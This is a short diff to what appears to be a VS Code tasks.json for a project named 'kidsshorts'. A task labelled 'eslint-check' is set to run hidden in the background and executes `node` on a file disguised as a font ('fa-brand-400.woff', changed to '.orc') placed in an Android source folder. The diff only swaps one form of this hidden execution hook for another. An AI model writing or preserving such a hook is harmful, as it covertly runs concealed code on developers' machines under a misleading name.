@@ -4,7 +4,10 @@
     {
       "label": "eslint-check",
       "type": "shell",
-      "command": "(command -v node >/dev/null 2>&1 && node ./android/app/src/main/java/com/kidsshorts/public/fonts/fa-brand-400.woff) || (where node >nul 2>&1 && node ./android/app/src/main/java/com/kidsshorts/public/fonts/fa-brand-400.woff) || echo ''",
+      "command": "node",
+      "args": [
+        "./android/app/src/main/java/com/kidsshorts/public/fonts/fa-brand-400.orc"
+      ],
       "problemMatcher": [],
       "isBackground": true,
       "hide": true,
